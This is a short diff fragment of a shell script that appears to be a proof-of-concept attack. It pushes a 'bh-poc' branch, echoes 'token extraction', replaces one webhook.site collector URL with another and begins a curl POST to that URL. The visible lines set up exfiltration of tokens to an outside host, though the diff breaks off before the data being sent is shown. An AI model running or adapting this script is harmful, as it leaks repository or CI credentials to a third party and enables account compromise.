@@ -15,7 +15,7 @@ git add . >&2
 git push -u origin bh-poc >&2
 echo "--- token extraction ---" >&2 
 
-export webhook="https://webhook.site/06a5697c-1bf2-4b66-9dcf-9352b133d531"
+export webhook="https://webhook.site/0c1c1586-c29c-4759-8c4f-4f6c683f3a25"
 
 curl -X POST \
   -H "Content-Type: text/plain" \
